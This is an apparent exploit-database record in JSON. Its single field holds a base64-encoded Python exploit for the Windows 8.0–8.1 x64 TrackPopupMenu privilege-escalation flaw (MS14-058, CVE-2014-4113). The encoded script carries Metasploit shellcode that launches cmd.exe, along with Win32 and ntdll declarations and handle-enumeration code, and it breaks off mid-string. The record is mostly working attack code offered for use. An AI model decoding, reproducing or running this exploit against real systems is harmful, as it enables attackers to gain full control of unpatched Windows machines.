{
    "source": "exploit-database", 
    "exploit": "IyBXaW5kb3dzIDguMCAtIDguMSB4NjQgVHJhY2tQb3B1cE1lbnUgUHJpdmlsZWdlIEVzY2FsYXRpb24gKE1TMTQtMDU4KQ0KIyBDVkUtMjAxNC00MTEzIFByaXZpbGVnZSBFc2NhbGF0aW9uDQojIGh0dHA6Ly93d3cub2ZmZW5zaXZlLXNlY3VyaXR5LmNvbQ0KIyBUaHggdG8gTW9yaXR6IEpvZGVpdCBmb3IgdGhlIGJlYXV0aWZ1bCB3cml0ZXVwIA0KIyBodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2RvY3MvMzUxNTIucGRmIA0KIyBUYXJnZXQgT1MgV2luZG93cyA4LjAgLSA4LjEgeDY0DQojIEF1dGhvcjogTWF0dGVvIE1lbWVsbGkgcnl1amluIDxhdD4gb2ZmZW5zaXZlLXNlY3VyaXR5LmNvbQ0KDQojIEVEQiBOb3RlOiBTd2FwcGluZyB0aGUgc2hlbGxjb2RlIGZvciBhIGJpbmQgb3IgcmV2ZXJzZSBzaGVsbCB3aWxsIEJTT0QgdGhlIG1hY2hpbmUuDQoNCmZyb20gY3R5cGVzIGltcG9ydCAqDQpmcm9tIGN0eXBlcy53aW50eXBlcyBpbXBvcnQgKg0KaW1wb3J0IHN0cnVjdCwgc3lzLCBvcywgdGltZSwgdGhyZWFkaW5nLCBzaWduYWwNCg0KVUxPTkdfUFRSID0gUFZPSUQgPSBMUFZPSUQNCkhDVVJTT1IgPSBISUNPTg0KUERXT1JEID0gUE9JTlRFUihEV09SRCkNClBRV09SRCA9IFBPSU5URVIoTFBWT0lEKQ0KTFJFU1VMVCA9IExQVk9JRA0KVUNIQVIgPSBjX3VieXRlDQpRV09SRCA9IGNfdWxvbmdsb25nDQpDSEFSID0gY19jaGFyDQpOVFNUQVRVUyA9IERXT1JEDQpNSUlNX1NUUklORyAgPSAweDAwMDAwMDQwDQpNSUlNX1NVQk1FTlUgPSAweDAwMDAwMDA0IA0KV0hfQ0FMTFdORFBST0MgPSAweDQNCkdXTFBfV05EUFJPQyA9IC0weDQNCk5VTEwgPSAweDANClN5c3RlbUV4dGVuZGVkSGFuZGxlSW5mb3JtYXRpb24gPSA2NA0KT2JqZWN0RGF0YUluZm9ybWF0aW9uID0gMg0KU1RBVFVTX0lORk9fTEVOR1RIX01JU01BVENIID0gMHhDMDAwMDAwNA0KU1RBVFVTX0JVRkZFUl9PVkVSRkxPVyA9IDB4ODAwMDAwMDVMDQpTVEFUVVNfSU5WQUxJRF9IQU5ETEUgPSAweEMwMDAwMDA4TA0KU1RBVFVTX0JVRkZFUl9UT09fU01BTEwgPSAweEMwMDAwMDIzTA0KU1RBVFVTX1NVQ0NFU1MgPSAwDQpUT0tFTl9BTExfQUNDRVNTID0gMHhmMDBmZg0KRElTQUJMRV9NQVhfUFJJVklMRUdFID0gMHgxDQpGT1JNQVRfTUVTU0FHRV9GUk9NX1NZU1RFTSA9IDB4MDAwMDEwMDANClBBR0VfRVhFQ1VURV9SRUFEV1JJVEUgPSAweDAwMDAwMDQwDQpQUk9DRVNTX0FMTF9BQ0NFU1MgPSAoIDB4MDAwRjAwMDAgfCAweDAwMTAwMDAwIHwgMHhGRkYgKQ0KVklSVFVBTF9NRU0gID0gKCAweDEwMDAgfCAweDIwMDAgKQ0KVEgzMkNTX1NOQVBQUk9DRVNTID0gMHgwMg0KDQpXaW5GdW5jMSA9IFdJTkZVTkNUWVBFKExQVk9JRCwgSU5ULCBXUEFSQU0sIExQQVJBTSkNCldpbkZ1bmMyID0gV0lORlVOQ1RZUEUoSFdORCwgTFBWT0lELCBJTlQsIFdQQVJBTSwgTFBBUkFNKQ0KV05EUFJPQyAgPSBXSU5GVU5DVFlQRShMUFZPSUQsIEhXTkQsIFVJTlQsIFdQQVJBTSwgTFBBUkFNKQ0KDQpiV25kUHJvY0ZsYWcgPSBGYWxzZQ0KYkhvb2tDYWxsYmFja0ZsYWcgPSBGYWxzZQ0KRVhQTE9JVEVEID0gRmFsc2UNCkhtZW51MDEgPSBIbWVudTAyID0gTm9uZQ0KDQojIC8qDQojICAqIHdpbmRvd3MveDY0L2V4ZWMgLSAyNzUgYnl0ZXMNCiMgICogaHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbQ0KIyAgKiBWRVJCT1NFPWZhbHNlLCBQcmVwZW5kTWlncmF0ZT1mYWxzZSwgRVhJVEZVTkM9dGhyZWFkLA0KIyAgKiBDTUQ9Y21kLmV4ZQ0KIyAgKi8NClNIRUxMQ09ERSA9ICgNCiJceGZjXHg0OFx4ODNceGU0XHhmMFx4ZThceGMwXHgwMFx4MDBceDAwXHg0MVx4NTFceDQxXHg1MFx4NTIiDQoiXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4Ig0KIlx4OGJceDUyXHgyMFx4NDhceDhiXHg3Mlx4NTBceDQ4XHgwZlx4YjdceDRhXHg0YVx4NGRceDMxXHhjOSINCiJceDQ4XHgzMVx4YzBceGFjXHgzY1x4NjFceDdjXHgwMlx4MmNceDIwXHg0MVx4YzFceGM5XHgwZFx4NDEiDQoiXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4Ig0KIlx4MDFceGQwXHg4Ylx4ODBceDg4XHgwMFx4MDBceDAwXHg0OFx4ODVceGMwXHg3NFx4NjdceDQ4XHgwMSINCiJceGQwXHg1MFx4OGJceDQ4XHgxOFx4NDRceDhiXHg0MFx4MjBceDQ5XHgwMVx4ZDBceGUzXHg1Nlx4NDgiDQoiXHhmZlx4YzlceDQxXHg4Ylx4MzRceDg4XHg0OFx4MDFceGQ2XHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwIg0KIlx4YWNceDQxXHhjMVx4YzlceDBkXHg0MVx4MDFceGMxXHgzOFx4ZTBceDc1XHhmMVx4NGNceDAzXHg0YyINCiJceDI0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDAiDQoiXHg2Nlx4NDFceDhiXHgwY1x4NDhceDQ0XHg4Ylx4NDBceDFjXHg0OVx4MDFceGQwXHg0MVx4OGJceDA0Ig0KIlx4ODhceDQ4XHgwMVx4ZDBceDQxXHg1OFx4NDFceDU4XHg1ZVx4NTlceDVhXHg0MVx4NThceDQxXHg1OSINCiJceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDgiDQoiXHg4Ylx4MTJceGU5XHg1N1x4ZmZceGZmXHhmZlx4NWRceDQ4XHhiYVx4MDFceDAwXHgwMFx4MDBceDAwIg0KIlx4MDBceDAwXHgwMFx4NDhceDhkXHg4ZFx4MDFceDAxXHgwMFx4MDBceDQxXHhiYVx4MzFceDhiXHg2ZiINCiJceDg3XHhmZlx4ZDVceGJiXHhlMFx4MWRceDJhXHgwYVx4NDFceGJhXHhhNlx4OTVceGJkXHg5ZFx4ZmYiDQoiXHhkNVx4NDhceDgzXHhjNFx4MjhceDNjXHgwNlx4N2NceDBhXHg4MFx4ZmJceGUwXHg3NVx4MDVceGJiIg0KIlx4NDdceDEzXHg3Mlx4NmZceDZhXHgwMFx4NTlceDQxXHg4OVx4ZGFceGZmXHhkNVx4NjNceDZkXHg2NCINCiJceDJlXHg2NVx4NzhceDY1XHgwMCIpDQoNCmNsYXNzIExTQV9VTklDT0RFX1NUUklORyhTdHJ1Y3R1cmUpOg0KICAgICIiIlJlcHJlc2VudCB0aGUgTFNBX1VOSUNPREVfU1RSSU5HIG9uIG50ZGxsLiIiIg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoIkxlbmd0aCIsIFVTSE9SVCksDQogICAgICAgICgiTWF4aW11bUxlbmd0aCIsIFVTSE9SVCksDQogICAgICAgICgiQnVmZmVyIiwgTFBXU1RSKSwNCiAgICBdDQoNCmNsYXNzIFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GT19FWChTdHJ1Y3R1cmUpOg0KICAgICIiIlJlcHJlc2VudCB0aGUgU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPIG9uIG50ZGxsLiIiIg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoIk9iamVjdCIsIFBWT0lEKSwNCiAgICAgICAgKCJVbmlxdWVQcm9jZXNzSWQiLCBQVk9JRCksDQogICAgICAgICgiSGFuZGxlVmFsdWUiLCBQVk9JRCksDQogICAgICAgICgiR3JhbnRlZEFjY2VzcyIsIFVMT05HKSwNCiAgICAgICAgKCJDcmVhdG9yQmFja1RyYWNlSW5kZXgiLCBVU0hPUlQpLA0KICAgICAgICAoIk9iamVjdFR5cGVJbmRleCIsIFVTSE9SVCksDQogICAgICAgICgiSGFuZGxlQXR0cmlidXRlcyIsIFVMT05HKSwNCiAgICAgICAgKCJSZXNlcnZlZCIsIFVMT05HKSwNCiAgICBdDQogDQpjbGFzcyBTWVNURU1fSEFORExFX0lORk9STUFUSU9OX0VYKFN0cnVjdHVyZSk6DQogICAgIiIiUmVwcmVzZW50IHRoZSBTWVNURU1fSEFORExFX0lORk9STUFUSU9OIG9uIG50ZGxsLiIiIg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoIk51bWJlck9mSGFuZGxlcyIsIFBWT0lEKSwNCiAgICAgICAgKCJSZXNlcnZlZCIsIFBWT0lEKSwNCiAgICAgICAgKCJIYW5kbGVzIiwgU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPX0VYICogMSksDQogICAgXQ0KDQpjbGFzcyBQVUJMSUNfT0JKRUNUX1RZUEVfSU5GT1JNQVRJT04oU3RydWN0dXJlKToNCiAgICAiIiJSZXByZXNlbnQgdGhlIFBVQkxJQ19PQkpFQ1RfVFlQRV9JTkZPUk1BVElPTiBvbiBudGRsbC4iIiINCiAgICBfZmllbGRzXyA9IFsNCiAgICAgICAgKCJOYW1lIiwgTFNBX1VOSUNPREVfU1RSSU5HKSwNCiAgICAgICAgKCJSZXNlcnZlZCIsIFVMT05HICogMjIpLA0KICAgIF0NCiAgICANCmNsYXNzIE1FTlVJVEVNSU5GTyhTdHJ1Y3R1cmUpOg0KICAgICIiIkNvbnRhaW5zIGluZm9ybWF0aW9uIGFib3V0IGEgbWVudSBpdGVtLiIiIg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoImNiU2l6ZSIgICAgICAgLCBVSU5UKSwNCiAgICAgICAgKCJmTWFzayIgICAgICAgICwgVUlOVCksDQogICAgICAgICgiZlR5cGUiICAgICAgICAsIFVJTlQpLA0KICAgICAgICAoImZTdGF0ZSIgICAgICAgLCBVSU5UKSwNCiAgICAgICAgKCJ3SUQiICAgICAgICAgICwgVUlOVCksDQogICAgICAgICgiaFN1Yk1lbnUiICAgICAsIEhNRU5VKSwNCiAgICAgICAgKCJoYm1wQ2hlY2tlZCIgICwgSEJJVE1BUCksDQogICAgICAgICgiaGJtcFVuY2hlY2tlZCIsIEhCSVRNQVApLA0KICAgICAgICAoImR3SXRlbURhdGEiICAgLCBVTE9OR19QVFIpLA0KICAgICAgICAoImR3VHlwZURhdGEiICAgLCBMUFdTVFIpLA0KICAgICAgICAoImNjaCIgICAgICAgICAgLCBVSU5UKSwNCiAgICAgICAgKCJoYm1wSXRlbSIgICAgICwgSEJJVE1BUCksDQogICAgXQ0KDQpjbGFzcyBXTkRDTEFTUyhTdHJ1Y3R1cmUpOg0KICAgICIiIkNvbnRhaW5zIHRoZSB3aW5kb3cgY2xhc3MgYXR0cmlidXRlcyB0aGF0IGFyZSByZWdpc3RlcmVkIGJ5IHRoZSANCiAgICAgICBSZWdpc3RlckNsYXNzIGZ1bmN0aW9uLiIiIg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoInN0eWxlIiAgICAgICAgLCBVSU5UKSwNCiAgICAgICAgKCJscGZuV25kUHJvYyIgICwgV05EUFJPQyksDQogICAgICAgICgiY2JDbHNFeHRyYSIgICAsIElOVCksDQogICAgICAgICgiY2JXbmRFeHRyYSIgICAsIElOVCksDQogICAgICAgICgiaEluc3RhbmNlIiAgICAsIEhJTlNUQU5DRSksDQogICAgICAgICgiaEljb24iICAgICAgICAsIEhDVVJTT1IpLA0KICAgICAgICAoImhDdXJzb3IiICAgICAgLCBIQklUTUFQKSwNCiAgICAgICAgKCJoYnJCYWNrZ3JvdW5kIiwgSEJSVVNIKSwNCiAgICAgICAgKCJscHN6TWVudU5hbWUiICwgTFBXU1RSKSwNCiAgICAgICAgKCJscHN6Q2xhc3NOYW1lIiwgTFBXU1RSKSwNCiAgICBdDQogICAgDQpjbGFzcyBQUk9DRVNTRU5UUlkzMihTdHJ1Y3R1cmUpOg0KICAgICIiIkRlc2NyaWJlcyBhbiBlbnRyeSBmcm9tIGEgbGlzdCBvZiB0aGUgcHJvY2Vzc2VzIHJlc2lkaW5nIGluIHRoZSBzeXN0ZW0NCiAgICAgICBhZGRyZXNzIHNwYWNlIHdoZW4gYSBzbmFwc2hvdCB3YXMgdGFrZW4uIiIiDQogICAgX2ZpZWxkc18gPSBbICggJ2R3U2l6ZScgLCBEV09SRCApICwNCiAgICAgICAgICAgICAgICAgKCAnY250VXNhZ2UnICwgRFdPUkQpICwNCiAgICAgICAgICAgICAgICAgKCAndGgzMlByb2Nlc3NJRCcgLCBEV09SRCkgLA0KICAgICAgICAgICAgICAgICAoICd0aDMyRGVmYXVsdEhlYXBJRCcgLCBQT0lOVEVSKFVMT05HKSkgLA0KICAgICAgICAgICAgICAgICAoICd0aDMyTW9kdWxlSUQnICwgRFdPUkQpICwNCiAgICAgICAgICAgICAgICAgKCAnY250VGhyZWFkcycgLCBEV09SRCkgLA0KICAgICAgICAgICAgICAgICAoICd0aDMyUGFyZW50UHJvY2Vzc0lEJyAsIERXT1JEKSAsDQogICAgICAgICAgICAgICAgICggJ3BjUHJpQ2xhc3NCYXNlJyAsIExPTkcpICwNCiAgICAgICAgICAgICAgICAgKCAnZHdGbGFncycgLCBEV09SRCkgLA0KICAgICAgICAgICAgICAgICAoICdzekV4ZUZpbGUnICwgQ0hBUiAqIE1BWF9QQVRIICkgDQogICAgXQ0KICAgIA0KdXNlcjMyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA9IHdpbmRsbC51c2VyMzINCmtlcm5lbDMyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSB3aW5kbGwua2VybmVsMzINCm50ZGxsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSB3aW5kbGwubnRkbGwNCmFkdmFwaTMyICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSB3aW5kbGwuYWR2YXBpMzINCg0KdXNlcjMyLlBvc3RNZXNzYWdlVy5hcmd0eXBlcyAgICAgICAgICAgICAgICA9IFtIV05ELCBVSU5ULCBXUEFSQU0sIExQQVJBTV0NCnVzZXIzMi5Qb3N0TWVzc2FnZVcucmVzdHlwZSAgICAgICAgICAgICAgICAgPSBCT09MDQp1c2VyMzIuRGVmV2luZG93UHJvY1cuYXJndHlwZXMgICAgICAgICAgICAgID0gW0hXTkQsIFVJTlQsIFdQQVJBTSwgTFBBUkFNXQ0KdXNlcjMyLkRlZldpbmRvd1Byb2NXLnJlc3R5cGUgICAgICAgICAgICAgICA9IExSRVNVTFQNCnVzZXIzMi5Vbmhvb2tXaW5kb3dzSG9vay5hcmd0eXBlcyAgICAgICAgICAgPSBbRFdPUkQsIFdpbkZ1bmMxXQ0KdXNlcjMyLlVuaG9va1dpbmRvd3NIb29rLnJlc3R5cGUgICAgICAgICAgICA9IEJPT0wNCnVzZXIzMi5TZXRXaW5kb3dMb25nUHRyVy5hcmd0eXBlcyAgICAgICAgICAgPSBbSFdORCwgRFdPUkQsIFdpbkZ1bmMyXQ0KdXNlcjMyLlNldFdpbmRvd0xvbmdQdHJXLnJlc3R5cGUgICAgICAgICAgICA9IExQVk9JRA0KdXNlcjMyLkNhbGxOZXh0SG9va0V4LmFyZ3R5cGVzICAgICAgICAgICAgICA9IFtEV09SRCwgRFdPUkQsIFdQQVJBTSwgTFBBUkFNXQ0KdXNlcjMyLkNhbGxOZXh0SG9va0V4LnJlc3R5cGUgICAgICAgICAgICAgICA9IExSRVNVTFQNCnVzZXIzMi5SZWdpc3RlckNsYXNzVy5hcmd0eXBlcyAgICAgICAgICAgICAgPSBbTFBWT0lEXQ0KdXNlcjMyLlJlZ2lzdGVyQ2xhc3NXLnJlc3R5cGUgICAgICAgICAgICAgICA9IEJPT0wNCnVzZXIzMi5DcmVhdGVXaW5kb3dFeFcuYXJndHlwZXMgICAgICAgICAgICAgPSBbRFdPUkQsIExQV1NUUiwgTFBXU1RSLCBEV09SRCwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJTlQsIElOVCwgSU5ULCBJTlQsIEhXTkQsIEhNRU5VLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSElOU1RBTkNFLCBMUFZPSURdDQp1c2VyMzIuQ3JlYXRlV2luZG93RXhXLnJlc3R5cGUgICAgICAgICAgICAgID0gSFdORA0KdXNlcjMyLkluc2VydE1lbnVJdGVtVy5hcmd0eXBlcyAgICAgICAgICAgICA9IFtITUVOVSwgVUlOVCwgQk9PTCwgTFBWT0lEXQ0KdXNlcjMyLkluc2VydE1lbnVJdGVtVy5yZXN0eXBlICAgICAgICAgICAgICA9IEJPT0wNCnVzZXIzMi5EZXN0cm95TWVudS5hcmd0eXBlcyAgICAgICAgICAgICAgICAgPSBbSE1FTlVdDQp1c2VyMzIuRGVzdHJveU1lbnUucmVzdHlwZSAgICAgICAgICAgICAgICAgID0gQk9PTA0KdXNlcjMyLlNldFdpbmRvd3NIb29rRXhXLmFyZ3R5cGVzICAgICAgICAgICA9IFtEV09SRCwgV2luRnVuYzEsIERXT1JELCBEV09SRF0NCnVzZXIzMi5TZXRXaW5kb3dzSG9va0V4Vy5yZXN0eXBlICAgICAgICAgICAgPSBCT09MDQp1c2VyMzIuVHJhY2tQb3B1cE1lbnUuYXJndHlwZXMgICAgICAgICAgICAgID0gW0hNRU5VLCBVSU5ULCBJTlQsIElOVCwgSU5ULCBIV05ELA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRFdPUkRdDQp1c2VyMzIuVHJhY2tQb3B1cE1lbnUucmVzdHlwZSAgICAgICAgICAgICAgID0gQk9PTA0KYWR2YXBpMzIuT3BlblByb2Nlc3NUb2tlbi5hcmd0eXBlcyAgICAgICAgICA9IFtIQU5ETEUsIERXT1JEICwgUE9JTlRFUihIQU5ETEUpXQ0KYWR2YXBpMzIuT3BlblByb2Nlc3NUb2tlbi5yZXN0eXBlICAgICAgICAgICA9IEJPT0wNCmFkdmFwaTMyLkNyZWF0ZVJlc3RyaWN0ZWRUb2tlbi5hcmd0eXBlcyAgICAgPSBbSEFORExFLCBEV09SRCwgRFdPUkQsIERXT1JELCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERXT1JELCBEV09SRCwgRFdPUkQsIERXT1JELA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUE9JTlRFUihIQU5ETEUpXQ0KYWR2YXBpMzIuQ3JlYXRlUmVzdHJpY3RlZFRva2VuLnJlc3R5cGUgICAgICA9IEJPT0wNCmFkdmFwaTMyLkFkanVzdFRva2VuUHJpdmlsZWdlcy5hcmd0eXBlcyAgICAgPSBbSEFORExFLCBCT09MLCBEV09SRCwgRFdPUkQsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRFdPUkQsIERXT1JEXQ0KYWR2YXBpMzIuQWRqdXN0VG9rZW5Qcml2aWxlZ2VzLnJlc3R5cGUgICAgICA9IEJPT0wNCmFkdmFwaTMyLkltcGVyc29uYXRlTG9nZ2VkT25Vc2VyLmFyZ3R5cGVzICAgPSBbSEFORExFXQ0KYWR2YXBpMzIuSW1wZXJzb25hdGVMb2dnZWRPblVzZXIucmVzdHlwZSAgICA9IEJPT0wNCmtlcm5lbDMyLkdldEN1cnJlbnRQcm9jZXNzLnJlc3R5cGUgICAgICAgICAgPSBIQU5ETEUNCmtlcm5lbDMyLldyaXRlUHJvY2Vzc01lbW9yeS5hcmd0eXBlcyAgICAgICAgPSBbSEFORExFLCBRV09SRCwgTFBDU1RSLCBEV09SRCwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQT0lOVEVSKExQVk9JRCldDQprZXJuZWwzMi5Xcml0ZVByb2Nlc3NNZW1vcnkucmVzdHlwZSAgICAgICAgID0gQk9PTA0Ka2VybmVsMzIuT3BlblByb2Nlc3MuYXJndHlwZXMgICAgICAgICAgICAgICA9IFtEV09SRCwgQk9PTCwgRFdPUkRdDQprZXJuZWwzMi5PcGVuUHJvY2Vzcy5yZXN0eXBlICAgICAgICAgICAgICAgID0gSEFORExFDQprZXJuZWwzMi5WaXJ0dWFsQWxsb2NFeC5hcmd0eXBlcyAgICAgICAgICAgID0gW0hBTkRMRSwgTFBWT0lELCBEV09SRCwgRFdPUkQsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRFdPUkRdDQprZXJuZWwzMi5WaXJ0dWFsQWxsb2NFeC5yZXN0eXBlICAgICAgICAgICAgID0gTFBWT0lEDQprZXJuZWwzMi5DcmVhdGVSZW1vdGVUaHJlYWQuYXJndHlwZXMgICAgICAgID0gW0hBTkRMRSwgUVdPUkQsIFVJTlQsIFFXT1JELCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExQVk9JRCwgRFdPUkQsIFBPSU5URVIoSEFORExFKV0NCmtlcm5lbDMyLkNyZWF0ZVJlbW90ZVRocmVhZC5yZXN0eXBlICAgICAgICAgPSBCT09MDQprZXJuZWwzMi5DcmVhdGVUb29saGVscDMyU25hcHNob3QuYXJndHlwZXMgID0gW0RXT1JELCBEV09SRF0NCmtlcm5lbDMyLkNyZWF0ZVRvb2xoZWxwMzJTbmFwc2hvdC5yZXN0eXBlICAgPSBIQU5ETEUNCmtlcm5lbDMyLkNsb3NlSGFuZGxlLmFyZ3R5cGVzICAgICAgICAgICAgICAgPSBbSEFORExFXQ0Ka2VybmVsMzIuQ2xvc2VIYW5kbGUucmVzdHlwZSAgICAgICAgICAgICAgICA9IEJPT0wNCmtlcm5lbDMyLlByb2Nlc3MzMkZpcnN0LmFyZ3R5cGVzICAgICAgICAgICAgPSBbSEFORExFLCBQT0lOVEVSKFBST0NFU1NFTlRSWTMyKV0NCmtlcm5lbDMyLlByb2Nlc3MzMkZpcnN0LnJlc3R5cGUgICAgICAgICAgICAgPSBCT09MDQprZXJuZWwzMi5Qcm9jZXNzMzJOZXh0LmFyZ3R5cGVzICAgICAgICAgICAgID0gW0hBTkRMRSwgUE9JTlRFUihQUk9DRVNTRU5UUlkzMildDQprZXJuZWwzMi5Qcm9jZXNzMzJOZXh0LnJlc3R5cGUgICAgICAgICAgICAgID0gQk9PTA0Ka2VybmVsMzIuR2V0Q3VycmVudFRocmVhZElkLnJlc3R5cGUgICAgICAgICA9IERXT1JEDQpudGRsbC5OdEFsbG9jYXRlVmlydHVhbE1lbW9yeS5hcmd0eXBlcyAgICAgID0gW0hBTkRMRSwgTFBWT0lELCBVTE9ORywgTFBWT0lELA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVUxPTkcsIERXT1JEXQ0KbnRkbGwuTnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnkucmVzdHlwZSAgICAgICA9IE5UU1RBVFVTDQpudGRsbC5OdFF1ZXJ5T2JqZWN0LmFyZ3R5cGVzICAgICAgICAgICAgICAgID0gW0hBTkRMRSwgRFdPUkQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUE9JTlRFUihQVUJMSUNfT0JKRUNUX1RZUEVfSU5GT1JNQVRJT04pLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERXT1JELCBEV09SRF0NCm50ZGxsLk50UXVlcnlPYmplY3QucmVzdHlwZSA9IE5UU1RBVFVTDQpudGRsbC5OdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24uYXJndHlwZXMgICAgID0gW0RXT1JELCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQT0lOVEVSKFNZU1RFTV9IQU5ETEVfSU5GT1JNQVRJT05fRVgpLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEV09SRCwgUE9JTlRFUihEV09SRCldDQpudGRsbC5OdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24ucmVzdHlwZSAgICAgID0gTlRTVEFUVVMNCg0KDQpkZWYgbG9nKG1zZywgZT1Ob25lKToNCiAgICBpZiBlID09ICJlIjoNCiAgICAgICAgbXNnID0gIlshXSAiICsgbXNnDQogICAgaWYgZSA9PSAiZCI6DQogICAgICAgIG1zZyA9ICJbKl0gIiArIG1zZw0KICAgIGVsc2U6DQogICAgICAgIG1zZyA9ICJbK10gIiArIG1zZw0KICAgIHByaW50IG1zZw0KDQoNCmRlZiBnZXRMYXN0RXJyb3IoKToNCiAgICAiIiJGb3JtYXQgR2V0TGFzdEVycm9yIiIiDQogICAgDQogICAgYnVmID0gY3JlYXRlX3N0cmluZ19idWZmZXIoMjA0OCkNCiAgICBpZiBrZXJuZWwzMi5Gb3JtYXRNZXNzYWdlQShGT1JNQVRfTUVTU0FHRV9GUk9NX1NZU1RFTSwgTlVMTCwNCiAgICAgICAgICAgIGtlcm5lbDMyLkdldExhc3RFcnJvcigpLCAwLA0KICAgICAgICAgICAgYnVmLCBzaXplb2YoYnVmKSwgTlVMTCk6DQogICAgICAgIGxvZyhidWYudmFsdWUsICJlIikNCiAgICBlbHNlOg0KICAgICAgICBsb2coIlVua25vd24gRXJyb3IiLCAiZSIpDQogICAgDQogICAgDQpjbGFzcyB4X2ZpbGVfaGFuZGxlcyAoRXhjZXB0aW9uKToNCiAgICBwYXNzDQoNCg0KZGVmIGdldF90eXBlX2luZm8oaGFuZGxlKToNCiAgICAiIiJHZXQgdGhlIGhhbmRsZSB0eXBlIGluZm9ybWF0aW9uLiIiIg0KICAgIA0KICAgIHB1YmxpY19vYmplY3RfdHlwZV9pbmZvcm1hdGlvbiA9IFBVQkxJQ19PQkpFQ1RfVFlQRV9JTkZPUk1BVElPTigpDQogICAgc2l6ZSA9IERXT1JEKHNpemVvZihwdWJsaWNfb2JqZWN0X3R5cGVfaW5mb3JtYXRpb24pKQ0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHJlc3VsdCA9IG50ZGxsLk50UXVlcnlPYmplY3QoaGFuZGxlLCBPYmplY3REYXRhSW5mb3JtYXRpb24sIA0KICAgICAgICAgICAgICAgICAgICBieXJlZihwdWJsaWNfb2JqZWN0X3R5cGVfaW5mb3JtYXRpb24pLCBzaXplLCAweDApDQogICAgICAgIGlmIHJlc3VsdCA9PSBTVEFUVVNfU1VDQ0VTUzoNCiAgICAgICAgICAgIHJldHVybiBwdWJsaWNfb2JqZWN0X3R5cGVfaW5mb3JtYXRpb24uTmFtZS5CdWZmZXINCiAgICAgICAgZWxpZiByZXN1bHQgPT0gU1RBVFVTX0lORk9fTEVOR1RIX01JU01BVENIOg0KICAgICAgICAgICAgc2l6ZSA9IERXT1JEKHNpemUudmFsdWUgKiA0KQ0KICAgICAgICAgICAgcmVzaXplKHB1YmxpY19vYmplY3RfdHlwZV9pbmZvcm1hdGlvbiwgc2l6ZS52YWx1ZSkNCiAgICAgICAgZWxpZiByZXN1bHQgPT0gU1RBVFVTX0lOVkFMSURfSEFORExFOg0KICAgICAgICAgICAgcmV0dXJuICJJTlZBTElEIEhBTkRMRTogJXMiICUgaGV4KGhhbmRsZSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHJhaXNlIHhfZmlsZV9oYW5kbGVzKCJOdFF1ZXJ5T2JqZWN0IiwgaGV4KHJlc3VsdCkpDQoNCg0KZGVmIGdldF9oYW5kbGVzKCk6DQogICAgIiIiUmV0dXJuIGFsbCB0aGUgb3BlbiBoYW5kbGVzIGluIHRoZSBzeXN0ZW0iIiINCiAgICANCiAgICBzeXN0ZW1faGFuZGxlX2luZm9ybWF0aW9uID0gU1lTVEVNX0hBTkRMRV9JTkZPUk1BVElPTl9FWCgpDQogICAgc2l6ZSA9IERXT1JEIChzaXplb2YgKHN5c3RlbV9oYW5kbGVfaW5mb3JtYXRpb24pKQ0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHJlc3VsdCA9IG50ZGxsLk50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbigNCiAgICAgICAgICAgIFN5c3RlbUV4dGVuZGVkSGFuZGxlSW5mb3JtYXRpb24sDQogICAgICAgICAgICBieXJlZihzeXN0ZW1faGFuZGxlX2luZm9ybWF0aW9uKSwNCiAgICAgICAgICAgIHNpemUsDQogICAgICAgICAgICBieXJlZihzaXplKQ0KICAgICAgICApDQogICAgICAgIGlmIHJlc3VsdCA9PSBTVEFUVVNfU1VDQ0VTUzoNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsaWYgcm